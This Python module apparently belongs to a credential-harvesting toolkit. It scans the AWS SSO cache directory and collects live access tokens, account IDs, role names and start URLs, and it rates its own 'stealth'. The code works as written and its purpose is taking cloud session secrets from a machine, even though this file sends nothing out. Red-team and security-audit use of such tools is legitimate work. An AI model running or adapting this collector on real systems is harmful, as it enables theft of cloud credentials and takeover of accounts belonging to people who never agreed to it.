"""AWS SSO cache parser — reads ~/.aws/sso/cache/*.json for active SSO sessions."""

from __future__ import annotations

import json
from pathlib import Path
from typing import List

from ..base import BaseCollector
from .. import CollectorRegistry
from ...types import CollectedToken, DiscoveredToken
from ...secure import secure
from ...platform_utils import aws_dir


@CollectorRegistry.register
class AwsSsoCacheCollector(BaseCollector):
    service = "aws"
    source = "sso_cache"
    stealth_score = 5

    def _cache_dir(self) -> Path:
        return aws_dir() / "sso" / "cache"

    def discover(self) -> List[DiscoveredToken]:
        results = []
        cache_dir = self._cache_dir()
        if not cache_dir.exists():
            return results

        try:
            for f in cache_dir.glob("*.json"):
                try:
                    data = json.loads(f.read_text())
                    # SSO cache files with accessToken are active sessions
                    if "accessToken" in data:
                        account = data.get("accountId", "unknown")
                        role = data.get("roleName", "unknown")
                        results.append(DiscoveredToken(
                            service=self.service,
                            source=self.source,
                            path=str(f),
                            account_hint=f"{account}/{role}",
                            stealth_score=self.stealth_score,
                            details=f"expires={data.get('expiresAt', '?')}",
                        ))
                    elif "startUrl" in data:
                        # SSO registration cache (client token)
                        results.append(DiscoveredToken(
                            service=self.service,
                            source=self.source,
                            path=str(f),
                            account_hint=data.get("startUrl", "?"),
                            stealth_score=self.stealth_score,
                            details="sso_registration",
                        ))
                except (json.JSONDecodeError, KeyError):
                    continue
        except Exception as e:
            self._warn(f"Failed to scan {cache_dir}: {e}")

        return results

    def collect(self) -> List[CollectedToken]:
        results = []
        cache_dir = self._cache_dir()
        if not cache_dir.exists():
            return results

        try:
            for f in cache_dir.glob("*.json"):
                try:
                    data = json.loads(f.read_text())
                    access_token = data.get("accessToken")
                    if not access_token:
                        continue

                    results.append(CollectedToken(
                        service=self.service,
                        source=self.source,
                        stealth_score=self.stealth_score,
                        account_id=data.get("accountId"),
                        username=data.get("roleName"),
                        access_token=secure(access_token),
                        expires_at=data.get("expiresAt"),
                        extra={
                            "start_url": data.get("startUrl"),
                            "region": data.get("region"),
                            "role_name": data.get("roleName"),
                            "account_id": data.get("accountId"),
                        },
                    ))
                except (json.JSONDecodeError, KeyError):
                    continue
        except Exception as e:
            self._warn(f"Failed to collect from {cache_dir}: {e}")

        return results
